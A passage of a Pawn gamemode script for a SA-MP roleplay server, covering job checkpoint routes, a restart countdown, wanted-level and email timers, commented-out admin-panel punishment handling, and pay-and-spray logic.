	    if(JobStep[playerid] == 27) SetPlayerRaceCheckpoint(playerid, 0, 2290.9165,841.0883,13.9592,2350.4082,1025.8792,10.7723,4.0);
	    if(JobStep[playerid] == 28) SetPlayerRaceCheckpoint(playerid, 0, 2350.4082,1025.8792,10.7723,2570.7004,1070.5811,10.7773,4.0);
	    if(JobStep[playerid] == 29) SetPlayerRaceCheckpoint(playerid, 0, 2570.7004,1070.5811,10.7773,2613.5254,1315.6500,10.7696,4.0);
	    if(JobStep[playerid] == 30) SetPlayerRaceCheckpoint(playerid, 0, 2613.5254,1315.6500,10.7696,2476.1697,1476.3761,10.7715,4.0);
	    if(JobStep[playerid] == 31) SetPlayerRaceCheckpoint(playerid, 0, 2476.1697,1476.3761,10.7715,2401.2478,1616.5609,10.7727,4.0);
	    if(JobStep[playerid] == 32) SetPlayerRaceCheckpoint(playerid, 0, 2401.2478,1616.5609,10.7727,2291.8828,1775.9521,10.7812,4.0);
	    if(JobStep[playerid] == 33) SetPlayerRaceCheckpoint(playerid, 0, 2291.8828,1775.9521,10.7812,2154.7061,1996.3882,10.7744,4.0);
	    if(JobStep[playerid] == 34) SetPlayerRaceCheckpoint(playerid, 0, 2154.7061,1996.3882,10.7744,2228.1877,2386.0630,10.7777,4.0);
	    if(JobStep[playerid] == 35) SetPlayerRaceCheckpoint(playerid, 0, 2228.1877,2386.0630,10.7777,2086.0520,2456.9954,10.8048,4.0);
	    if(JobStep[playerid] == 36) SetPlayerRaceCheckpoint(playerid, 0, 2086.0520,2456.9954,10.8048,1948.1777,2396.3440,10.7688,4.0);
	    if(JobStep[playerid] == 37) SetPlayerRaceCheckpoint(playerid, 0, 1948.1777,2396.3440,10.7688,1922.7677,2317.8069,10.8393,4.0);
	    if(JobStep[playerid] == 38) SetPlayerRaceCheckpoint(playerid, 0, 1922.7677,2317.8069,10.8393,1922.8735,2117.9375,10.8652,4.0);
	    if(JobStep[playerid] == 39) SetPlayerRaceCheckpoint(playerid, 0, 1922.8735,2117.9375,10.8652,2093.9612,2017.9711,10.8407,4.0);
	    if(JobStep[playerid] == 40) SetPlayerRaceCheckpoint(playerid, 0, 2093.9612,2017.9711,10.8407,2039.7142,1522.0779,10.7595,4.0);
	    if(JobStep[playerid] == 41) SetPlayerRaceCheckpoint(playerid, 0, 2039.7142,1522.0779,10.7595,2040.6129,1169.0469,10.7807,4.0);
	    if(JobStep[playerid] == 42) SetPlayerRaceCheckpoint(playerid, 0, 2040.6129,1169.0469,10.7807,2038.9994,878.8145,7.1755,4.0);
	    if(JobStep[playerid] == 43) SetPlayerRaceCheckpoint(playerid, 0, 2038.9994,878.8145,7.1755,1755.5402,619.8901,21.3552,4.0);
	    if(JobStep[playerid] == 44) SetPlayerRaceCheckpoint(playerid, 0, 1755.5402,619.8901,21.3552,1619.3414,186.8276,33.5024,4.0);
	    if(JobStep[playerid] == 45) SetPlayerRaceCheckpoint(playerid, 0, 1619.3414,186.8276,33.5024,1659.4628,-329.5979,40.4135,4.0);
	    if(JobStep[playerid] == 46) SetPlayerRaceCheckpoint(playerid, 0, 1659.4628,-329.5979,40.4135,1688.2992,-728.0701,49.8404,4.0);
	    if(JobStep[playerid] == 47) SetPlayerRaceCheckpoint(playerid, 0, 1688.2992,-728.0701,49.8404,1412.3439,-937.3050,35.6120,4.0);
	    if(JobStep[playerid] == 48) SetPlayerRaceCheckpoint(playerid, 0, 1412.3439,-937.3050,35.6120,1432.5333,-1037.7094,23.7933,4.0);
	    if(JobStep[playerid] == 49) SetPlayerRaceCheckpoint(playerid, 0, 1432.5333,-1037.7094,23.7933,1574.0338,-1138.6904,23.6757,4.0);
	    if(JobStep[playerid] == 50) SetPlayerRaceCheckpoint(playerid, 0, 1574.0338,-1138.6904,23.6757,1711.5553,-1263.2328,13.4910,4.0);
	    if(JobStep[playerid] == 51) SetPlayerRaceCheckpoint(playerid, 0, 1711.5553,-1263.2328,13.4910,1590.8885,-1437.7626,13.4817,4.0);
	    if(JobStep[playerid] == 52) SetPlayerRaceCheckpoint(playerid, 0, 1590.8885,-1437.7626,13.4817,1428.2323,-1567.3893,13.4529,4.0);
	    if(JobStep[playerid] == 53) SetPlayerRaceCheckpoint(playerid, 0, 1428.2323,-1567.3893,13.4529,1446.8442,-1735.5527,13.4789,4.0);
	    if(JobStep[playerid] == 54) SetPlayerRaceCheckpoint(playerid, 0, 1446.8442,-1735.5527,13.4789,1580.1357,-1874.8420,13.4791,4.0);
	    if(JobStep[playerid] == 55) SetPlayerRaceCheckpoint(playerid, 0, 1580.1357,-1874.8420,13.4791,1818.1030,-1904.3914,13.5025,4.0);
	    if(JobStep[playerid] == 56) SetPlayerRaceCheckpoint(playerid, 0, 1818.1030,-1904.3914,13.5025,1958.2472,-1999.3572,13.4949,4.0);
	    if(JobStep[playerid] == 57) SetPlayerRaceCheckpoint(playerid, 0, 1958.2472,-1999.3572,13.4949,1936.2253,-2163.5068,13.4765,4.0);
	    if(JobStep[playerid] == 58)
		{
		    JobStep[playerid] = 0;
	 		SetPlayerRaceCheckpoint(playerid, 0, 1693.2972,-2197.6602,13.4714,1941.3706,-2169.2083,13.4851,4.0);
		}
	}
	return 1;
}

public restartTimer()
{
    iGMXTick--;
   	switch(iGMXTick) {
	    case 0: {
			KillTimer(iGMXTimer);
			SetTimer("GameModeInitExitFunc", 1000, 0);
	    }
	    case 4: GameTextForAll("~w~The server will restart in...~n~ ~r~1~w~ seconds.", 1110, 5);
	    case 5: GameTextForAll("~w~The server will restart in...~n~ ~r~2~w~ seconds.", 1110, 5);
	    case 6: GameTextForAll("~w~The server will restart in...~n~ ~r~3~w~ seconds.", 1110, 5);
	    case 7: GameTextForAll("~w~The server will restart in...~n~ ~r~4~w~ seconds.", 1110, 5);
	    case 8: GameTextForAll("~w~The server will restart in...~n~ ~r~5~w~ seconds.", 1110, 5);
	    case 9: GameTextForAll("~w~The server will restart in...~n~ ~r~6~w~ seconds.", 1110, 5);
	    case 10: GameTextForAll("~w~The server will restart in...~n~ ~r~7~w~ seconds.", 1110, 5);
	    case 11: GameTextForAll("~w~The server will restart in...~n~ ~r~8~w~ seconds.", 1110, 5);
	    case 12: GameTextForAll("~w~The server will restart in...~n~ ~r~9~w~ seconds.", 1110, 5);
	    case 13: GameTextForAll("~w~The server will restart in...~n~ ~r~10~w~ seconds.", 1110, 5);
	    case 14: GameTextForAll("~w~The server will restart in...~n~ ~r~11~w~ seconds.", 1110, 5);
	    case 15: GameTextForAll("~w~The server will restart in...~n~ ~r~12~w~ seconds.", 1110, 5);
	    case 16: GameTextForAll("~w~The server will restart in...~n~ ~r~13~w~ seconds.", 1110, 5);
	    case 17: GameTextForAll("~w~The server will restart in...~n~ ~r~14~w~ seconds.", 1110, 5);
	    case 18: GameTextForAll("~w~The server will restart in...~n~ ~r~15~w~ seconds.", 1110, 5);
		case 19: GameTextForAll("~w~The server will restart in...~n~ ~r~16~w~ seconds.", 1110, 5);
		case 20: GameTextForAll("~w~The server will restart in...~n~ ~r~17~w~ seconds.", 1110, 5);
		case 21: GameTextForAll("~w~The server will restart in...~n~ ~r~18~w~ seconds.", 1110, 5);
		case 22: GameTextForAll("~w~The server will restart in...~n~ ~r~19~w~ seconds.", 1110, 5);
		case 23: {
			GameTextForAll("~w~The server will restart in...~n~ ~r~20~w~ seconds.", 1110, 5);
		}
		case 24: GameTextForAll("~w~The server will restart in...~n~ ~r~21~w~ seconds.", 1110, 5);
		case 25: GameTextForAll("~w~The server will restart in...~n~ ~r~22~w~ seconds.", 1110, 5);
		case 26: GameTextForAll("~w~The server will restart in...~n~ ~r~23~w~ seconds.", 1110, 5);
		case 27: GameTextForAll("~w~The server will restart in...~n~ ~r~24~w~ seconds.", 1110, 5);
		case 28: GameTextForAll("~w~The server will restart in...~n~ ~r~25~w~ seconds.", 1110, 5);
		case 29: GameTextForAll("~w~The server will restart in...~n~ ~r~26~w~ seconds.", 1110, 5);
		case 30: GameTextForAll("~w~The server will restart in...~n~ ~r~27~w~ seconds.", 1110, 5);
		case 31: GameTextForAll("~w~The server will restart in...~n~ ~r~28~w~ seconds.", 1110, 5);
		case 32: GameTextForAll("~w~The server will restart in...~n~ ~r~29~w~ seconds.", 1110, 5);
		case 33: GameTextForAll("~w~The server will restart in...~n~ ~r~30~w~ seconds.", 1110, 5);
		case 34: GameTextForAll("~w~The server will restart in...~n~ ~r~31~w~ seconds.", 1110, 5);
		case 35: GameTextForAll("~w~The server will restart in...~n~ ~r~32~w~ seconds.", 1110, 5);
		case 36: GameTextForAll("~w~The server will restart in...~n~ ~r~33~w~ seconds.", 1110, 5);
		case 37: GameTextForAll("~w~The server will restart in...~n~ ~r~34~w~ seconds.", 1110, 5);
		case 38: GameTextForAll("~w~The server will restart in...~n~ ~r~35~w~ seconds.", 1110, 5);
		case 39: GameTextForAll("~w~The server will restart in...~n~ ~r~36~w~ seconds.", 1110, 5);
		case 40: GameTextForAll("~w~The server will restart in...~n~ ~r~37~w~ seconds.", 1110, 5);
		case 41: GameTextForAll("~w~The server will restart in...~n~ ~r~38~w~ seconds.", 1110, 5);
		case 42: GameTextForAll("~w~The server will restart in...~n~ ~r~39~w~ seconds.", 1110, 5);
		case 43: {
			GameTextForAll("~w~The server will restart in...~n~ ~r~40~w~ seconds.", 1110, 5);
		}
		case 44: GameTextForAll("~w~The server will restart in...~n~ ~r~41~w~ seconds.", 1110, 5);
		case 45: GameTextForAll("~w~The server will restart in...~n~ ~r~42~w~ seconds.", 1110, 5);
		case 46: GameTextForAll("~w~The server will restart in...~n~ ~r~43~w~ seconds.", 1110, 5);
		case 47: GameTextForAll("~w~The server will restart in...~n~ ~r~44~w~ seconds.", 1110, 5);
		case 48: GameTextForAll("~w~The server will restart in...~n~ ~r~45~w~ seconds.", 1110, 5);
		case 49: GameTextForAll("~w~The server will restart in...~n~ ~r~46~w~ seconds.", 1110, 5);
		case 50: GameTextForAll("~w~The server will restart in...~n~ ~r~47~w~ seconds.", 1110, 5);
		case 51: GameTextForAll("~w~The server will restart in...~n~ ~r~48~w~ seconds.", 1110, 5);
		case 52: GameTextForAll("~w~The server will restart in...~n~ ~r~49~w~ seconds.", 1110, 5);
		case 53: GameTextForAll("~w~The server will restart in...~n~ ~r~50~w~ seconds.", 1110, 5);
		case 54: GameTextForAll("~w~The server will restart in...~n~ ~r~51~w~ seconds.", 1110, 5);
		case 55: GameTextForAll("~w~The server will restart in...~n~ ~r~52~w~ seconds.", 1110, 5);
		case 56: GameTextForAll("~w~The server will restart in...~n~ ~r~53~w~ seconds.", 1110, 5);
		case 57: GameTextForAll("~w~The server will restart in...~n~ ~r~54~w~ seconds.", 1110, 5);
		case 58: GameTextForAll("~w~The server will restart in...~n~ ~r~55~w~ seconds.", 1110, 5);
		case 59: GameTextForAll("~w~The server will restart in...~n~ ~r~56~w~ seconds.", 1110, 5);
		case 60: GameTextForAll("~w~The server will restart in...~n~ ~r~57~w~ seconds.", 1110, 5);
		case 61: GameTextForAll("~w~The server will restart in...~n~ ~r~58~w~ seconds.", 1110, 5);
		case 62: GameTextForAll("~w~The server will restart in...~n~ ~r~59~w~ seconds.", 1110, 5);
	}
	return 1;
}
public FiveSecondsTimer()
{
	foreach(Player, i)
	{
	    if(PlayerInfo[i][pWantedLevel] == 0 && Tigaanel[i] < 1)
		{
			SetPlayerWantedLevel(i,0);
			PlayerTextDrawHide(i, WantedText[i]);
   			DestroyDynamic3DTextLabel(WantedScris[i]);
		}
	    else if(PlayerInfo[i][pWantedLevel] == 1)
		{
  			SetPlayerWantedLevel(i,1);
	    	new str1[256];
		    PlayerTextDrawShow(i, WantedText[i]);
   			format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[i]/60+1);
			PlayerTextDrawSetString(i, WantedText[i], str1);
			if(GetPlayerWantedLevel(i) == 1)
			{
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
				UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
			}
		}
		else if(PlayerInfo[i][pWantedLevel] == 2)
		{
  			SetPlayerWantedLevel(i,2);
	    	new str1[256];
		    PlayerTextDrawShow(i, WantedText[i]);
    		format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[i]/60+1);
			PlayerTextDrawSetString(i, WantedText[i], str1);
			if(GetPlayerWantedLevel(i) == 2)
			{
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
				UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
			}
		}
		else if(PlayerInfo[i][pWantedLevel] == 3)
		{
  			SetPlayerWantedLevel(i,3);
	    	new str1[256];
		   	PlayerTextDrawShow(i, WantedText[i]);
    		format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[i]/60+1);
			PlayerTextDrawSetString(i, WantedText[i], str1);
			if(GetPlayerWantedLevel(i) == 3)
			{
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
				UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
			}
		}
		else if(PlayerInfo[i][pWantedLevel] == 4)
		{
  			SetPlayerWantedLevel(i,4);
	    	new str1[256];
		    PlayerTextDrawShow(i, WantedText[i]);
    		format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[i]/60+1);
			PlayerTextDrawSetString(i, WantedText[i], str1);
			if(GetPlayerWantedLevel(i) == 4)
			{
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
				UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
			}
		}
		else if(PlayerInfo[i][pWantedLevel] == 5)
		{
  			SetPlayerWantedLevel(i,5);
	    	new str1[256];
	    	PlayerTextDrawShow(i, WantedText[i]);
   			format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[i]/60+1);
			PlayerTextDrawSetString(i, WantedText[i], str1);
			if(GetPlayerWantedLevel(i) == 5)
			{
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
				UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
			}
		}
		else if(PlayerInfo[i][pWantedLevel] >= 6)
		{
  			SetPlayerWantedLevel(i,6);
		   	new str1[256];
		    PlayerTextDrawShow(i, WantedText[i]);
    		format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[i]/60+1);
			PlayerTextDrawSetString(i, WantedText[i], str1);
			if(GetPlayerWantedLevel(i) == 6)
			{
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
				UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
			}
		}
		if(PlayerInfo[i][pPaintBallG] > 0)
		{
			PlayerMapIconPaint(i);
		}
	}
	/*new query[300],playerid,giverid,actionid,actiontime,complaint,reason[64],stringg[256],playername[30],givername[30],var100[300],dm,reason2[64];
	//Check panel
	format(query, sizeof(query), "SELECT * FROM `panelactions`");
	new Cache: stringresult = mysql_query(SQL, query);
	if(cache_get_row_count() > 0)
	{
		for(new i, j = cache_get_row_count (); i != j; ++i)
		{
		    playerid                    = cache_get_field_content_int(i, "playerid");
		    giverid                     = cache_get_field_content_int(i, "giverid");
   			actionid                    = cache_get_field_content_int(i, "actionid");
   			actiontime                  = cache_get_field_content_int(i, "actiontime");
   			complaint                 	= cache_get_field_content_int(i, "complaintid");
			dm							= cache_get_field_content_int(i, "dm");
   			cache_get_field_content(i, "playername", playername, SQL, sizeof(playername));
   			cache_get_field_content(i, "givername", givername, SQL, sizeof(givername));
   			cache_get_field_content(i, "reason", reason, SQL, sizeof(reason));
            if(actionid == 1)
   			{
      			if(complaint > 0)
         		{
        			format(stringg,sizeof(stringg),"AdmPanel: %s has been banned by %s for %d days, reason: %s [complaint:%d].",playername,givername,actiontime,reason,complaint);
   					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s [complaint:%d]",reason,complaint);
				}
				else
				{
    				format(stringg,sizeof(stringg),"AdmPanel: %s has been banned by %s for %d days, reason: %s.",playername,givername,actiontime,reason);
	    			SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s",reason);
				}
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','1','%d','%s','%s','%s')",playerid,giverid,actiontime,reason2,playername,givername);
				mysql_tquery(SQL,var100,"","");
				foreach(Player, idd)
				{
				    if(!IsPlayerConnected(idd)) return 1;
					if(PlayerInfo[idd][pSQLID] == playerid)
					{
						KickEx(idd);
					}
				}
			}
			else if(actionid == 2)
   			{
      			if(complaint > 0)
         		{
        			format(stringg,sizeof(stringg),"AdmPanel: %s has been permanent banned by %s, reason: %s [complaint:%d].",playername,givername,reason,complaint);
 					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s [complaint:%d]",reason,complaint);
				}
				else
				{
    				format(stringg,sizeof(stringg),"AdmPanel: %s has been permanent banned by %s, reason: %s.",playername,givername,reason);
   					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s",reason);
				}
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','2','0','%s','%s','%s')",playerid,giverid,reason2,playername,givername);
				mysql_tquery(SQL,var100,"","");
				foreach(Player, idd)
				{
				    if(!IsPlayerConnected(idd)) return 1;
					if(PlayerInfo[idd][pSQLID] == playerid)
					{
						KickEx(idd);
					}
				}
			}
			else if(actionid == 3)
   			{
      			if(complaint > 0)
         		{
        			format(stringg, sizeof(stringg), "AdmPanel: %s was jailed by %s for %d minutes, reason: %s [complaint:%d]",playername,givername,actiontime,reason,complaint);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s [complaint:%d]",reason,complaint);
				}
				else
				{
    				format(stringg, sizeof(stringg), "AdmPanel: %s was jailed by %s for %d minutes, reason: %s",playername,givername,actiontime,reason);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s",reason);
				}
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','6','%d','%s','%s','%s')",playerid,giverid,actiontime,reason2,playername,givername);
				mysql_tquery(SQL,var100,"","");
				foreach(Player, idd)
				{
				    if(!IsPlayerConnected(idd)) return 1;
					if(PlayerInfo[idd][pSQLID] == playerid)
					{
						ResetPlayerWeaponsEx(idd);
						ResetPlayerWeapons(idd);
						WantedPoints[idd] = 0;
						PlayerInfo[idd][pJailed] = 2;
						PlayerInfo[idd][pJailTime] = actiontime*60;
						JailPrice[idd] = 0;
						SetPlayerInterior(idd, 10);
						new rand;
						rand = random(sizeof(gRandomAJailSpawns));
						SetPlayerPosEx(idd,gRandomAJailSpawns[rand][0],gRandomAJailSpawns[rand][1],gRandomAJailSpawns[rand][2]);
						if(dm > 0)
						{
							PlayerInfo[idd][pGunLic] = 0;
							PlayerInfo[idd][pGunLicT] = 0;
							PlayerInfo[idd][pGunLicSuspend] = dm + 1;
						}
					}
				}
			}
			else if(actionid == 4)
   			{
      			if(complaint > 0)
         		{
        			format(stringg, sizeof(stringg), "AdmPanel: %s received a warn from admin %s, reason: %s [complaint:%d].",playername,givername,reason,complaint);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s [complaint:%d]",reason,complaint);
				}
				else
				{
    				format(stringg, sizeof(stringg), "AdmPanel: %s received a warn from admin %s, reason: %s.",playername,givername,reason);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s",reason);
				}
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','5','%d','%s','%s','%s')",playerid,giverid,actiontime,reason2,playername,givername);
				mysql_tquery(SQL,var100,"","");
				foreach(Player, idd)
				{
				    if(!IsPlayerConnected(idd)) return 1;
					if(PlayerInfo[idd][pSQLID] == playerid)
					{
						PlayerInfo[idd][pWarns] += 1;
					}
				}
				format(query, sizeof(query), "SELECT * FROM `users` WHERE `id`='%d' ORDER BY `id`",playerid);
				new Cache: stringresultt = mysql_query(SQL, query);
				if(cache_get_row_count() > 0)
				{
					new warns,str[256],time;
					for(new is, js = cache_get_row_count (); is != js; ++is)
					{
						warns                    = cache_get_field_content_int(is, "Warnings");
					}
					if(warns > 2)
					{
						format(stringg, sizeof(stringg), "AdmPanel: %s has been banned by AdmBot for 3 days, reason: 3/3 warns.",playername);
						time = gettime() + (3*86400);
						mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', 'AdmBot', '3/3 warns', '0', 3, 0, 0, 1, %d)",
						playername,time);
						mysql_tquery(SQL,str,"","");
						mysql_format(SQL,str,sizeof(str),"UPDATE `users` SET `Warnings`='0' WHERE `name`='%s'",playername);
						mysql_tquery(SQL,str,"","");
						mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','0','1','3','3/3 warns','%s','AdmBot')",playerid,playername);
						mysql_tquery(SQL,var100,"","");
						SendClientMessageToAll(COLOR_ERROR, stringg);
						foreach(Player, idd)
						{
						    if(!IsPlayerConnected(idd)) return 1;
							if(PlayerInfo[idd][pSQLID] == playerid)
							{
								KickEx(idd);
							}
						}
					}
				}
				cache_delete(stringresultt);
			}
			else if(actionid == 5)
   			{
      			if(complaint > 0)
         		{
        			format(stringg, sizeof(stringg), "AdmPanel: %s has been muted by %s for %d minutes, reason: %s [complaint:%d].",playername,givername,actiontime,reason,complaint);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s [complaint:%d]",reason,complaint);
				}
				else
				{
    				format(stringg, sizeof(stringg), "AdmPanel: %s has been muted by %s for %d minutes, reason: %s.",playername,givername,actiontime,reason);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s",reason);
				}
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','7','%d','%s','%s','%s')",playerid,giverid,actiontime,reason2,playername,givername);
				mysql_tquery(SQL,var100,"","");
				foreach(Player, idd)
				{
				    if(!IsPlayerConnected(idd)) return 1;
					if(PlayerInfo[idd][pSQLID] == playerid)
					{
						PlayerInfo[idd][pMuted] = 1;
						PlayerInfo[idd][pMuteTime] = actiontime*60;
					}
				}
			}
			else if(actionid == 6)
   			{
      			if(complaint > 0)
         		{
        			format(stringg, sizeof(stringg), "AdmPanel: %s has been kicked by %s, reason: %s [complaint:%d].",playername,givername,reason,complaint);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s [complaint:%d]",reason,complaint);
				}
				else
				{
    				format(stringg, sizeof(stringg), "AdmPanel: %s has been kicked by %s, reason: %s.",playername,givername,reason);
					SendClientMessageToAll(COLOR_ERROR, stringg);
					format(reason2,sizeof(reason2),"%s",reason);
				}
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO kicklogs (`playerid`,`giverid`,`playername`,`givername`,`reason`) VALUES ('%d','%d','%s','%s','%s')", playerid,giverid,playername,givername,reason2);
				mysql_tquery(SQL,var100,"","");
				foreach(Player, idd)
				{
				    if(!IsPlayerConnected(idd)) return 1;
					if(PlayerInfo[idd][pSQLID] == playerid)
					{
						KickEx(idd);
					}
				}
			}
		}
		mysql_query(SQL,"DELETE FROM `panelactions`");
	}
	cache_delete(stringresult);*/
	// Check emails
	new query[300],playerid,giverid;
	format(query, sizeof(query), "SELECT * FROM `emails` WHERE `EmailRead` = '1' ORDER BY `ID`");
	new Cache: stringresult2 = mysql_query(SQL, query);
	if(cache_get_row_count() > 0)
	{
		for(new i, j = cache_get_row_count (); i != j; ++i)
		{
   			playerid                    = cache_get_field_content_int(i, "playerid");
   			giverid                     = cache_get_field_content_int(i, "giverid");
   			foreach(Player, idd)
   			{
   			    if(!IsPlayerConnected(idd)) return 1;
   			    if(PlayerInfo[idd][pSQLID] == playerid && PlayerInfo[idd][pNextNotification] < 1 && gPlayerLogged[idd] == 1 || PlayerInfo[idd][pSQLID] == giverid && PlayerInfo[idd][pNextNotification] < 1 && gPlayerLogged[idd] == 1)
   			    {
   			        SendClientMessage(idd, COLOR_YELLOW, "{FF6200}** {FFFF00}You have a new email. Use /email to read it. {FF6200}**");
   			        PlayerInfo[idd][pNextNotification] = 3600;
				}
			}
		}
	}
	cache_delete(stringresult2);
	// Auto Delete Server Logs
	//Auto Expire Clan
	/*format(query, sizeof(query), "SELECT * FROM `clans` WHERE `clanExpire` < '%d' AND `clanActive`='1' ORDER BY `clanID`",gettime());
	new Cache: stringresult8 = mysql_query(SQL, query);
	if(cache_get_row_count() > 0)
	{
		new pid,clanid;
		clanid = cache_get_field_content_int(0, "clanID");
		foreach(Player, id)
		{
			if(PlayerInfo[id][pClan] == clanid)
			{
				if(PlayerInfo[id][pCRank] < 7)
				{
					new stringname[128];
					SetPlayerName(id, PlayerInfo[id][pNormalName]);
					format(stringname,sizeof(stringname),"%s / RPG.Magic-Gaming.tk",PlayerInfo[id][pNormalName]);
					PlayerTextDrawSetString(id, logo[id], stringname);
					PlayerTextDrawShow(id, logo[id]);
					PlayerInfo[id][pClan] = 0;
					PlayerInfo[id][pCRank] = 0;
					PlayerInfo[id][pCWarns] = 0;
					PlayerInfo[id][pClanTag] = 0;
				}
			}
		}
		format(query, sizeof(query), "SELECT * FROM `users` WHERE `Clan` = '%d'",clanid);
		new Cache: stringresult9 = mysql_query(SQL, query);
		for(new id, jd = cache_get_row_count (); id != jd; ++id)
		{
			pid = cache_get_field_content_int(id, "id");
			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','Deoarece clanul a expirat toti membrii au fost dati afara, in afara de lider.')",pid);
			mysql_tquery(SQL,var100,"","");
		}
		cache_delete(stringresult9);
		mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `Clan`='0',`CRank`='0',`ClanTag`='0',`CWarns`='0' WHERE `Clan`='%d' AND `CRank` < '7'",clanid);
		mysql_tquery(SQL,var100,"","");
		mysql_format(SQL, var100, sizeof(var100), "UPDATE `clans` SET `clanActive`='0' WHERE `clanID`='%d'",clanid);
		mysql_tquery(SQL,var100,"","");
	}
	cache_delete(stringresult8);*/
	return 1;
}
forward coliziuniPNS();
public coliziuniPNS()
{
	for(new x = 0; x < MAX_PLAYERS; x++)
	{
		if(IsPlayerInRangeOfPoint(x, 100.0, 1029.3810,-1032.4768,31.9078) && IsPlayerInAnyVehicle(x))
		{
			if(coliziunipns[x] == 0) DisableRemoteVehicleCollisions(x, 1),coliziunipns[x] = 1;
		}
		else
		{
			if(coliziunipns[x] == 1) DisableRemoteVehicleCollisions(x, 0),coliziunipns[x] = 0;
		}
	}
	return 1;
}
public SetPlayerPNS()
{
	foreach(Player, x)
	{
	    new carid = GetPlayerVehicleID(x),
			Float:health,
			string[256];
    	if(IsPlayerInRangeOfPoint(x,15.0,1025.0671,-1023.7895,32.1016))
		{
	    	GetVehicleHealth(carid, health);
	    	if(health < 950.0)
	    	{
	    		if(GetPlayerState(x) == 2)
	    		{
	    	    	pnsmoney[x] = GetPlayerMoney(x);
					SetTimerEx("AfterSpray", 3000, false, "i", x);
					return 1;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(x,15.0,719.9537,-457.2771,16.3359))
		{
	    	GetVehicleHealth(carid, health);
	    	if(health < 950.0)
	    	{
	    		if(GetPlayerState(x) == 2)
	    		{
	    	    	pnsmoney[x] = GetPlayerMoney(x);
                	SetTimerEx("AfterSpray", 3000, false, "i", x);
					return 1;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(x,15.0,487.4134,-1740.1738,11.1370))
		{
	    	GetVehicleHealth(carid, health);
	   	 	if(health < 950.0)
	    	{
	    		if(GetPlayerState(x) == 2)
	    		{
	    	    	pnsmoney[x] = GetPlayerMoney(x);
                	SetTimerEx("AfterSpray", 3000, false, "i", x);
					return 1;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(x,15.0,2065.5911,-1831.4495,13.5469))
		{
	    	GetVehicleHealth(carid, health);
	    	if(health < 950.0)
	    	{
	    		if(GetPlayerState(x) == 2)
	    		{
	    	    	pnsmoney[x] = GetPlayerMoney(x);
            		SetTimerEx("AfterSpray", 3000, false, "i", x);
					return 1;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(x,15.0,1974.3198,2162.7249,11.0703))
		{
	    	GetVehicleHealth(carid, health);
	    	if(health < 950.0)
	    	{
	    		if(GetPlayerState(x) == 2)
	    		{
	    	    	pnsmoney[x] = GetPlayerMoney(x);
                	SetTimerEx("AfterSpray", 3000, false, "i", x);
					return 1;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(x,15.0,-100.1086,1117.3312,19.7417))
		{
